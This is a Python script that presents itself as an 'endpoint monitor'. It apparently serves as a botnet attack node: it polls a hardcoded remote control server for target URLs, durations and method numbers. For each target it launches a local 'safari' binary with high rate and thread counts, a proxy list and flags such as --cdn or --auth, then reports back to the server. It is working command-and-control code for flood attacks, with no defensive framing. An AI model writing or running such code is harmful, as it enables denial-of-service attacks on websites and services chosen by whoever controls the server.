import requests
import json
import time
import subprocess
import threading
import os
import sys
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('monitor.log'),
        logging.StreamHandler()
    ]
)

class EndpointMonitor:
    def __init__(self, base_url, username, check_interval=5):
        """
        Initialize the monitor
        
        Args:
            base_url: Base URL of the server (e.g., http://127.0.0.1:3001)
            username: Username to monitor (e.g., 'john')
            check_interval: How often to check for new items (seconds)
        """
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.check_interval = check_interval
        self.endpoint_url = f"{self.base_url}/{self.username}"
        self.removal_url = f"{self.base_url}/{self.username}/done"
        self.processed_items = set()  # Track processed items to avoid duplicates
        self.running = True
        self.active_processes = []  # Track active subprocesses
        
    def fetch_active_items(self):
        """Fetch active items from the endpoint"""
        try:
            response = requests.get(self.endpoint_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    connections = data.get('connections', [])
                    return connections
                else:
                    logging.error(f"API returned error: {data.get('message', 'Unknown error')}")
                    return []
            else:
                logging.error(f"HTTP {response.status_code}: {response.text}")
                return []
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return []
    
    def extract_item_key(self, item):
        """Create a unique key for each item"""
        if 'url' in item:
            return f"{item.get('url')}_{item.get('time')}_{item.get('method')}"
        else:
            return f"{item.get('ip')}_{item.get('port')}_{item.get('time')}"
    
    def execute_method_1(self, url, time_param, item_key):
        """Execute command for method 1 - ./safari url time  10000 8000 proxies.txt --cdn --raw"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
            
        command = ["./safari", url, str(time_int), "10000", "8000", "proxies.txt", "--cdn", "--raw"]
        
        logging.info(f"Method 1 - Executing: {' '.join(command)}")
        
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 1
            })
            
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 1 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 1 command: {e}")
            return None
    
    def execute_method_2(self, url, time_param, item_key):
        """Execute command for method 2 - ./safari url time 10000 8000 proxies.txt --cdn --auth"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
            
        command = ["./safari", url, str(time_int), "10000", "8000", "proxies.txt", "--cdn", "--auth"]
        
        logging.info(f"Method 2 - Executing: {' '.join(command)}")
        
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 2
            })
            
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 2 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 2 command: {e}")
            return None
    
    def execute_method_3(self, url, time_param, item_key):
        """Execute command for method 3 - ./safari url time 10000 8000 proxies.txt --raw"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
            
        command = ["./safari", url, str(time_int), "10000", "8000", "proxies.txt", "--raw"]
        
        logging.info(f"Method 3 - Executing: {' '.join(command)}")
        
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 3
            })
            
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 3 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 3 command: {e}")
            return None
    
    def execute_method_4(self, url, time_param, item_key):
        """Execute command for method 4 - ./safari url time 10000 8000 proxies.txt --auth"""
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60
            
        command = ["./safari", url, str(time_int), "10000", "8000", "proxies.txt", "--auth"]
        
        logging.info(f"Method 4 - Executing: {' '.join(command)}")
        
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 4
            })
            
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 4 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 4 command: {e}")
            return None
    
    def remove_item(self, url, time_param, item_key):
        """Remove item from the server after execution"""
        try:
            removal_params = {
                'url': url,
                'time': time_param
            }
            
            response = requests.get(f"{self.base_url}/{self.username}/visitors", params=removal_params)
            
            if response.status_code == 200:
                logging.info(f"Removed item: {item_key}")
            else:
                logging.warning(f"Failed to remove item {item_key}: HTTP {response.status_code}")
                
        except Exception as e:
            logging.error(f"Error removing item {item_key}: {e}")
    
    def cleanup_old_processes(self):
        """Clean up completed processes from tracking list"""
        current_time = datetime.now()
        self.active_processes = [
            p for p in self.active_processes 
            if p['process'].poll() is None
            or (current_time - p['start_time']).total_seconds() < 300
        ]
    
    def monitor_loop(self):
        """Main monitoring loop"""
        logging.info(f"Starting monitor for {self.endpoint_url}")
        logging.info(f"Check interval: {self.check_interval} seconds")
        
        while self.running:
            try:
                self.cleanup_old_processes()
                
                items = self.fetch_active_items()
                
                if items:
                    logging.info(f"Found {len(items)} active item(s)")
                    
                    for item in items:
                        item_key = self.extract_item_key(item)
                        
                        if item_key in self.processed_items:
                            continue
                        
                        if 'url' in item and 'method' in item:
                            url = item['url']
                            time_param = item['time']
                            method = item['method']
                            
                            logging.info(f"New item detected: {url} | Time: {time_param} | Method: {method}")
                            
                            self.processed_items.add(item_key)
                            
                            if str(method) == '1':
                                self.execute_method_1(url, time_param, item_key)
                            elif str(method) == '2':
                                self.execute_method_2(url, time_param, item_key)
                            elif str(method) == '3':
                                self.execute_method_3(url, time_param, item_key)
                            elif str(method) == '4':
                                self.execute_method_4(url, time_param, item_key)
                            else:
                                logging.warning(f"Unknown method: {method} for item {item_key}")
                        else:
                            logging.info(f"Legacy item detected: {item}")
                            self.processed_items.add(item_key)
                
                time.sleep(self.check_interval)
                
            except KeyboardInterrupt:
                logging.info("Received keyboard interrupt, shutting down...")
                self.stop()
                break
            except Exception as e:
                logging.error(f"Error in monitor loop: {e}")
                time.sleep(self.check_interval)
    
    def stop(self):
        """Stop the monitor and cleanup"""
        self.running = False
        logging.info("Stopping monitor...")
        
        for proc_info in self.active_processes:
            try:
                proc_info['process'].terminate()
                logging.info(f"Terminated process for {proc_info['item_key']}")
            except:
                pass
        
        time.sleep(2)
        
        for proc_info in self.active_processes:
            try:
                if proc_info['process'].poll() is None:
                    proc_info['process'].kill()
            except:
                pass

def main():
    """Main function"""
    BASE_URL = "http://64.118.132.61:3001"
    USERNAME = "admin"
    CHECK_INTERVAL = 5
    
    monitor = EndpointMonitor(BASE_URL, USERNAME, CHECK_INTERVAL)
    
    try:
        monitor.monitor_loop()
    except KeyboardInterrupt:
        monitor.stop()
        logging.info("Monitor stopped by user")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        monitor.stop()
        sys.exit(1)

if __name__ == "__main__":
    # Check if required file exists
    if not os.path.exists("safari"):
        logging.warning("Warning: safari binary not found in current directory")
    
    logging.info("Current directory: " + os.getcwd())
    
    main()
